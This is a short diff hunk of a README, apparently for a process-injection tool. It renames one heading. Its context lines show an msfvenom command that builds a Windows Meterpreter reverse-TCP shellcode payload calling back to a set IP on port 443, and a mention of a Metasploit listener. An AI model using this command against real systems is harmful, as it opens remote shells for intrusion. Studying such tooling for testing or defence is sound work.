@@ -28,7 +28,7 @@ Before running the code, you need to create a payload to be injected into the pr
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.84.142 LPORT=443 EXITFUNC=thread -f csharp
 ```
 
-## Payload Generation
+## Setting Up the Listener
 
 Configure a listener in Metasploit before executing the program using the following command:
 
